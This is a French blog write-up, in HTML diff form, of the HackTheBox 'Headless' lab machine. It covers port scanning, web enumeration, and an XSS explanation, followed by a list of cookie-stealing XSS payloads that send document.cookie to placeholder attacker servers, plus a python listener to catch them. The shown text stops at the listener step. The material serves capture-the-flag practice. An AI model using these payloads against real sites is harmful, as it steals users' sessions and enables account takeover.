@@ -1,0 +1,281 @@
+<!doctype html><html lang=fr dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="HackTheBox - Headless"><title>Headless</title>
+<link rel=canonical href=https://ticodevv.github.io/p/hackthebox/><link rel=stylesheet href=/scss/style.min.8e60baf4cd3fc55968717a6e39762f4d28ed7ef6007566b6c7970ad0fe907198.css><meta property='og:title' content="Headless"><meta property='og:description' content="HackTheBox - Headless"><meta property='og:url' content='https://ticodevv.github.io/p/hackthebox/'><meta property='og:site_name' content='Blog de Lukas'><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='HackTheBox'><meta property='article:tag' content='Writeup'><meta property='article:tag' content='Web'><meta property='article:published_time' content='2024-03-26T00:00:00+00:00'><meta property='article:modified_time' content='2024-03-26T00:00:00+00:00'><meta property='og:image' content='https://ticodevv.github.io/p/hackthebox/image_htbHeadless.webp'><meta name=twitter:title content="Headless"><meta name=twitter:description content="HackTheBox - Headless"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content='https://ticodevv.github.io/p/hackthebox/image_htbHeadless.webp'><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Afficher le menu">
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu222e7d970940f97102b60f41ca0d2ee4_164240_300x0_resize_box_3.png width=300 height=424 class=site-logo loading=lazy alt=Avatar>
+</a><span class=emoji>🐱‍💻</span></figure><div class=site-meta><h1 class=site-name><a href=/>Blog de Lukas</a></h1><h2 class=site-description>Un blog sur la sécurité, CTF writeups, des recherches et plus encore.</h2></div></header><ol class=menu-social><li><a href=https://github.com/ticodevv target=_blank title=GitHub rel=me><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://twitter.com/lukastaboga target=_blank title=Twitter rel=me><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/archives/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/search/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li><a href=/certification/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>Certification</span></a></li><li><a href=/whoami/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>whoami</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span>Mode sombre</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table des matières</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#port-scanning>Port Scanning</a></li><li><a href=#web-enumeration>Web Enumeration</a></li><li><a href=#web-exploitation>Web Exploitation</a></li><li><a href=#user>User</a></li><li><a href=#privilege-escalation>Privilege Escalation</a></li><li><a href=#root>root</a></li><li><a href=#source>Source</a></li></ol></nav></div></section></aside><main class="main full-width"><article class="has-image main-article"><header class=article-header><div class=article-image><a href=/p/hackthebox/><img src=/p/hackthebox/image_htbHeadless_hudf76949a72ee76888f27808e2d90c437_7638_800x0_resize_q75_h2_box_2.webp srcset="/p/hackthebox/image_htbHeadless_hudf76949a72ee76888f27808e2d90c437_7638_800x0_resize_q75_h2_box_2.webp 800w, /p/hackthebox/image_htbHeadless_hudf76949a72ee76888f27808e2d90c437_7638_1600x0_resize_q75_h2_box_2.webp 1600w" width=800 height=441 loading=lazy alt="Featured image of post Headless"></a></div><div class=article-details><header class=article-category><a href=/categories/hackthebox/>HackTheBox
+</a><a href=/categories/writeups/>Writeups</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/hackthebox/>Headless</a></h2><h3 class=article-subtitle>HackTheBox - Headless</h3></div><footer class=article-time><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published>Mar 26, 2024</time></div><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>6 minutes de lecture</time></div></footer></div></header><section class=article-content><p>Bonjour à tous ! Aujourd&rsquo;hui, je vous présente la machine Headless classée dans la catégorie easy sur HackTheBox. Nous y aborderons des concepts de base dans le domaine du web. 🙃</p><h2 id=port-scanning><a href=#port-scanning>#</a>
+Port Scanning</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>Mar 26, <span class=m>2024</span> - 09:34:43 <span class=o>(</span>CET<span class=o>)]</span> exegol-htb Headless: nmap -sV 10.10.11.8
+</span></span><span class=line><span class=cl>Starting Nmap 7.93 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2024-03-26 09:34 CET
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> headless.htb <span class=o>(</span>10.10.11.8<span class=o>)</span>
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.025s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>Not shown: <span class=m>995</span> closed tcp ports <span class=o>(</span>reset<span class=o>)</span>
+</span></span><span class=line><span class=cl>PORT      STATE    SERVICE VERSION
+</span></span><span class=line><span class=cl>22/tcp    open     ssh     OpenSSH 9.2p1 Debian 2+deb12u2 <span class=o>(</span>protocol 2.0<span class=o>)</span>
+</span></span><span class=line><span class=cl>787/tcp   filtered qsc
+</span></span><span class=line><span class=cl>5000/tcp  open     upnp?
+</span></span><span class=line><span class=cl>8085/tcp  filtered unknown
+</span></span><span class=line><span class=cl>16000/tcp filtered fmsas
+</span></span><span class=line><span class=cl><span class=m>1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span class=line><span class=cl>SF-Port5000-TCP:V<span class=o>=</span>7.93%I<span class=o>=</span>7%D<span class=o>=</span>3/26%Time<span class=o>=</span>660288BB%P<span class=o>=</span>aarch64-unknown-linux-gn
+</span></span><span class=line><span class=cl>SF:u%r<span class=o>(</span>GetRequest,BE1,<span class=s2>&#34;HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.2\
+</span></span></span><span class=line><span class=cl><span class=s2>SF:.2\x20Python/3\.11\.2\r\nDate:\x20Tue,\x2026\x20Mar\x202024\x2008:35:07
+</span></span></span><span class=line><span class=cl><span class=s2>SF:\x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Leng
+</span></span></span><span class=line><span class=cl><span class=s2>SF:th:\x202799\r\nSet-Cookie:\x20is_admin=InVzZXIi\.uAlmXlTvm8vyihjNaPDWnv
+</span></span></span><span class=line><span class=cl><span class=s2>SF:B_Zfs;\x20Path=/\r\nConnection:\x20close\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;ht
+</span></span></span><span class=line><span class=cl><span class=s2>SF:ml\x20lang=\&#34;en\&#34;&gt;\n&lt;head&gt;\n\x20\x20\x20\x20&lt;meta\x20charset=\&#34;UTF-8\&#34;&gt;
+</span></span></span><span class=line><span class=cl><span class=s2>SF:\n\x20\x20\x20\x20&lt;meta\x20name=\&#34;viewport\&#34;\x20content=\&#34;width=device-
+</span></span></span><span class=line><span class=cl><span class=s2>SF:width,\x20initial-scale=1\.0\&#34;&gt;\n\x20\x20\x20\x20&lt;title&gt;Under\x20Constr
+</span></span></span><span class=line><span class=cl><span class=s2>SF:uction&lt;/title&gt;\n\x20\x20\x20\x20&lt;style&gt;\n\x20\x20\x20\x20\x20\x20\x20\x
+</span></span></span><span class=line><span class=cl><span class=s2>SF:20body\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-famil
+</span></span></span><span class=line><span class=cl><span class=s2>SF:y:\x20&#39;Arial&#39;,\x20sans-serif;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
+</span></span></span><span class=line><span class=cl><span class=s2>SF:\x20\x20background-color:\x20#f7f7f7;\n\x20\x20\x20\x20\x20\x20\x20\x20
+</span></span></span><span class=line><span class=cl><span class=s2>SF:\x20\x20\x20\x20margin:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
+</span></span></span><span class=line><span class=cl><span class=s2>SF:\x20\x20padding:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
+</span></span></span><span class=line><span class=cl><span class=s2>SF:0display:\x20flex;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20jus
+</span></span></span><span class=line><span class=cl><span class=s2>SF:tify-content:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
+</span></span></span><span class=line><span class=cl><span class=s2>SF:x20align-items:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
+</span></span></span><span class=line><span class=cl><span class=s2>SF:0\x20height:\x20100vh;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\n\x20\x20\x
+</span></span></span><span class=line><span class=cl><span class=s2>SF:20\x20\x20\x20\x20\x20\.container\x20{\n\x20\x20\x20\x20\x20\x20\x20\x2
+</span></span></span><span class=line><span class=cl><span class=s2>SF:0\x20\x20\x20\x20text-align:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x
+</span></span></span><span class=line><span class=cl><span class=s2>SF:20\x20\x20\x20\x20background-color:\x20#fff;\n\x20\x20\x20\x20\x20\x20\
+</span></span></span><span class=line><span class=cl><span class=s2>SF:x20\x20\x20\x20\x20\x20border-radius:\x2010px;\n\x20\x20\x20\x20\x20\x2
+</span></span></span><span class=line><span class=cl><span class=s2>SF:0\x20\x20\x20\x20\x20\x20box-shadow:\x200px\x200px\x2020px\x20rgba\(0,\
+</span></span></span><span class=line><span class=cl><span class=s2>SF:x200,\x200,\x200\.2\);\n\x20\x20\x20\x20\x20&#34;</span><span class=o>)</span>%r<span class=o>(</span>RTSPRequest,16C,<span class=s2>&#34;&lt;!DOC
+</span></span></span><span class=line><span class=cl><span class=s2>SF:TYPE\x20HTML&gt;\n&lt;html\x20lang=\&#34;en\&#34;&gt;\n\x20\x20\x20\x20&lt;head&gt;\n\x20\x20\
+</span></span></span><span class=line><span class=cl><span class=s2>SF:x20\x20\x20\x20\x20\x20&lt;meta\x20charset=\&#34;utf-8\&#34;&gt;\n\x20\x20\x20\x20\x2
+</span></span></span><span class=line><span class=cl><span class=s2>SF:0\x20\x20\x20&lt;title&gt;Error\x20response&lt;/title&gt;\n\x20\x20\x20\x20&lt;/head&gt;\
+</span></span></span><span class=line><span class=cl><span class=s2>SF:n\x20\x20\x20\x20&lt;body&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;h1&gt;Error\x20r
+</span></span></span><span class=line><span class=cl><span class=s2>SF:esponse&lt;/h1&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Error\x20code:\x20400&lt;
+</span></span></span><span class=line><span class=cl><span class=s2>SF:/p&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Message:\x20Bad\x20request\x20v
+</span></span></span><span class=line><span class=cl><span class=s2>SF:ersion\x20\(&#39;RTSP/1\.0&#39;\)\.&lt;/p&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Err
+</span></span></span><span class=line><span class=cl><span class=s2>SF:or\x20code\x20explanation:\x20400\x20-\x20Bad\x20request\x20syntax\x20o
+</span></span></span><span class=line><span class=cl><span class=s2>SF:r\x20unsupported\x20method\.&lt;/p&gt;\n\x20\x20\x20\x20&lt;/body&gt;\n&lt;/html&gt;\n&#34;</span><span class=o>)</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></td></tr></table></div></div><p>Le serveur distant hôte 2 services ouverts :</p><ul><li>SSH server (OpenSSH 9.2p1)</li><li>HTTP server (upnp?)</li></ul><h2 id=web-enumeration><a href=#web-enumeration>#</a>
+Web Enumeration</h2><p>sur cette page web on peut y voir (Welcome to Our Website) avec un encadré bleu avec écrit (For Questions)</p><p><img src=/p/hackthebox/a.png width=2880 height=1708 srcset="/p/hackthebox/a_hu62748400a68df548ef65149588dec8ba_169481_480x0_resize_box_3.png 480w, /p/hackthebox/a_hu62748400a68df548ef65149588dec8ba_169481_1024x0_resize_box_3.png 1024w" loading=lazy alt=screen_web_site class=gallery-image data-flex-grow=168 data-flex-basis=404px></p><p>Cliquer sur le bouton puis nous accédons à une nouvelle page.</p><p><img src=/p/hackthebox/b.png width=2880 height=1706 srcset="/p/hackthebox/b_hu606cb0bcda99a9ec78462a6d2341e9cf_162671_480x0_resize_box_3.png 480w, /p/hackthebox/b_hu606cb0bcda99a9ec78462a6d2341e9cf_162671_1024x0_resize_box_3.png 1024w" loading=lazy alt=screen_web_site class=gallery-image data-flex-grow=168 data-flex-basis=405px></p><p>On peut y voir un formulaire de contact avec un champ de texte et un bouton submit.
+Remplissons le champ de texte avec une commande de base pour voir si il y a une faille d&rsquo;injection.</p><h2 id=web-exploitation><a href=#web-exploitation>#</a>
+Web Exploitation</h2><p><img src=/p/hackthebox/c.png width=586 height=1374 srcset="/p/hackthebox/c_hu48bdc3b574eb1d03ebb47d5b0e83f97d_54892_480x0_resize_box_3.png 480w, /p/hackthebox/c_hu48bdc3b574eb1d03ebb47d5b0e83f97d_54892_1024x0_resize_box_3.png 1024w" loading=lazy alt=screen_web_site class=gallery-image data-flex-grow=42 data-flex-basis=102px></p><p>Nous allons faire une faire une attaque xss.</p><p>Mais avant tout c&rsquo;est quoi une XSS :
+Imaginez un délicieux gâteau au chocolat, mais avec un ingrédient surprise caché à l&rsquo;intérieur - du piment !</p><p>L&rsquo;attaque XSS est un peu comme ça. Un individu malveillant glisse du code malveillant (le piment) dans un site web qui semble normal. Quand on visite le site (on mange le gâteau), notre navigateur exécute ce code sans méfiance, et paf! Nos informations peuvent être volées ou on peut être redirigé vers un faux site (comme si on avait mal au ventre à cause du piment).</p><p>Il existe deux façons courantes de cacher le piment :</p><p>XSS réfléchi : L&rsquo;individu malveillant envoie un lien piégé. Quand on clique dessus, le code malveillant est renvoyé par le site et exécuté par notre navigateur.</p><p>XSS stocké : L&rsquo;individu malveillant injecte le code directement dans le site web, affectant tous les visiteurs.</p><p><img src=/p/hackthebox/xss.webp width=600 height=460 srcset="/p/hackthebox/xss_hu0d204e6502301948aa7431092e262364_27528_480x0_resize_q75_h2_box_2.webp 480w, /p/hackthebox/xss_hu0d204e6502301948aa7431092e262364_27528_1024x0_resize_q75_h2_box_2.webp 1024w" loading=lazy alt=img_xss class=gallery-image data-flex-grow=130 data-flex-basis=313px></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&lt;img <span class=nv>src</span><span class=o>=</span>x <span class=nv>onerror</span><span class=o>=</span>this.src<span class=o>=</span><span class=s2>&#34;http://&lt;YOUR_SERVER_IP&gt;/?c=&#34;</span>+document.cookie&gt;
+</span></span><span class=line><span class=cl>&lt;img <span class=nv>src</span><span class=o>=</span>x <span class=nv>onerror</span><span class=o>=</span><span class=s2>&#34;location.href=&#39;http://&lt;YOUR_SERVER_IP&gt;/?c=&#39;+ document.cookie&#34;</span>&gt;
+</span></span><span class=line><span class=cl>&lt;script&gt;new Image<span class=o>()</span>.src<span class=o>=</span><span class=s2>&#34;http://&lt;IP&gt;/?c=&#34;</span>+encodeURI<span class=o>(</span>document.cookie<span class=o>)</span><span class=p>;</span>&lt;/script&gt;
+</span></span><span class=line><span class=cl>&lt;script&gt;new Audio<span class=o>()</span>.src<span class=o>=</span><span class=s2>&#34;http://&lt;IP&gt;/?c=&#34;</span>+escape<span class=o>(</span>document.cookie<span class=o>)</span><span class=p>;</span>&lt;/script&gt;
+</span></span><span class=line><span class=cl>&lt;script&gt;location.href <span class=o>=</span> <span class=s1>&#39;http://&lt;YOUR_SERVER_IP&gt;/Stealer.php?cookie=&#39;</span>+document.cookie&lt;/script&gt;
+</span></span><span class=line><span class=cl>&lt;script&gt;location <span class=o>=</span> <span class=s1>&#39;http://&lt;YOUR_SERVER_IP&gt;/Stealer.php?cookie=&#39;</span>+document.cookie&lt;/script&gt;
+</span></span><span class=line><span class=cl>&lt;script&gt;document.location <span class=o>=</span> <span class=s1>&#39;http://&lt;YOUR_SERVER_IP&gt;/Stealer.php?cookie=&#39;</span>+document.cookie&lt;/script&gt;
+</span></span><span class=line><span class=cl>&lt;script&gt;document.location.href <span class=o>=</span> <span class=s1>&#39;http://&lt;YOUR_SERVER_IP&gt;/Stealer.php?cookie=&#39;</span>+document.cookie&lt;/script&gt;
+</span></span><span class=line><span class=cl>&lt;script&gt;document.write<span class=o>(</span><span class=s1>&#39;&lt;img src=&#34;http://&lt;YOUR_SERVER_IP&gt;?c=&#39;</span>+document.cookie+<span class=s1>&#39;&#34; /&gt;&#39;</span><span class=o>)</span>&lt;/script&gt;
+</span></span><span class=line><span class=cl>&lt;script&gt;window.location.assign<span class=o>(</span><span class=s1>&#39;http://&lt;YOUR_SERVER_IP&gt;/Stealer.php?cookie=&#39;</span>+document.cookie<span class=o>)</span>&lt;/script&gt;
+</span></span><span class=line><span class=cl>&lt;script&gt;window<span class=o>[</span><span class=s1>&#39;location&#39;</span><span class=o>][</span><span class=s1>&#39;assign&#39;</span><span class=o>](</span><span class=s1>&#39;http://&lt;YOUR_SERVER_IP&gt;/Stealer.php?cookie=&#39;</span>+document.cookie<span class=o>)</span>&lt;/script&gt;
+</span></span><span class=line><span class=cl>&lt;script&gt;window<span class=o>[</span><span class=s1>&#39;location&#39;</span><span class=o>][</span><span class=s1>&#39;href&#39;</span><span class=o>](</span><span class=s1>&#39;http://&lt;YOUR_SERVER_IP&gt;/Stealer.php?cookie=&#39;</span>+document.cookie<span class=o>)</span>&lt;/script&gt;
+</span></span><span class=line><span class=cl>&lt;script&gt;document.location<span class=o>=[</span><span class=s2>&#34;http://&lt;YOUR_SERVER_IP&gt;?c&#34;</span>,document.cookie<span class=o>]</span>.join<span class=o>()</span>&lt;/script&gt;
+</span></span><span class=line><span class=cl>&lt;script&gt;var <span class=nv>i</span><span class=o>=</span>new Image<span class=o>()</span><span class=p>;</span>i.src<span class=o>=</span><span class=s2>&#34;http://&lt;YOUR_SERVER_IP&gt;/?c=&#34;</span>+document.cookie&lt;/script&gt;
+</span></span><span class=line><span class=cl>&lt;script&gt;window.location<span class=o>=</span><span class=s2>&#34;https://&lt;SERVER_IP&gt;/?c=&#34;</span>.concat<span class=o>(</span>document.cookie<span class=o>)</span>&lt;/script&gt;
+</span></span><span class=line><span class=cl>&lt;script&gt;var <span class=nv>xhttp</span><span class=o>=</span>new XMLHttpRequest<span class=o>()</span><span class=p>;</span>xhttp.open<span class=o>(</span><span class=s2>&#34;GET&#34;</span>, <span class=s2>&#34;http://&lt;SERVER_IP&gt;/?c=&#34;</span>%2Bdocument.cookie, <span class=nb>true</span><span class=o>)</span><span class=p>;</span>xhttp.send<span class=o>()</span><span class=p>;</span>&lt;/script&gt;
+</span></span><span class=line><span class=cl>&lt;script&gt;eval<span class=o>(</span>atob<span class=o>(</span><span class=s1>&#39;ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwczovLzxTRVJWRVJfSVA+P2M9IisgZG9jdW1lbnQuY29va2llICsiJyAvPiIp&#39;</span><span class=o>))</span><span class=p>;</span>&lt;/script&gt;
+</span></span><span class=line><span class=cl>&lt;script&gt;fetch<span class=o>(</span><span class=s1>&#39;https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net&#39;</span>, <span class=o>{</span>method: <span class=s1>&#39;POST&#39;</span>, mode: <span class=s1>&#39;no-cors&#39;</span>, body:document.cookie<span class=o>})</span><span class=p>;</span>&lt;/script&gt;
+</span></span><span class=line><span class=cl>&lt;script&gt;navigator.sendBeacon<span class=o>(</span><span class=s1>&#39;https://ssrftest.com/x/AAAAA&#39;</span>,document.cookie<span class=o>)</span>&lt;/script&gt;
+</span></span></code></pre></td></tr></table></div></div><p>Nous allons choisissait la commande suivante</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&lt;img <span class=nv>src</span><span class=o>=</span>x <span class=nv>onerror</span><span class=o>=</span>this.src<span class=o>=</span><span class=s2>&#34;http://&lt;YOUR_SERVER_IP&gt;/?c=&#34;</span>+document.cookie&gt;
+</span></span></code></pre></td></tr></table></div></div><p>Nous allons changer notre user-agent pour un user-agent de google afin que le serveur puisse accepter notre requête, on crée un nouvel agent avec qui se nomme xss avec comme string la commande xss
+<img src=/p/hackthebox/d.png width=1278 height=1218 srcset="/p/hackthebox/d_hu865ba2f20527522ce1d9cc2b33572989_183889_480x0_resize_box_3.png 480w, /p/hackthebox/d_hu865ba2f20527522ce1d9cc2b33572989_183889_1024x0_resize_box_3.png 1024w" loading=lazy alt=User-agent class=gallery-image data-flex-grow=104 data-flex-basis=251px></p><p>Avant de lancer l&rsquo;attaque, il faut créer un serveur pour récupérer les cookies.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 -m http.server <span class=m>80</span>
+</span></span></code></pre></td></tr></table></div></div><p>Une fois que l&rsquo;attaque est lancée, on peut voir que le serveur a reçu les cookies.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>Mar 26, <span class=m>2024</span> - 14:08:42 <span class=o>(</span>CET<span class=o>)]</span> exegol-htb /workspace: python3 -m http.server <span class=m>9999</span>
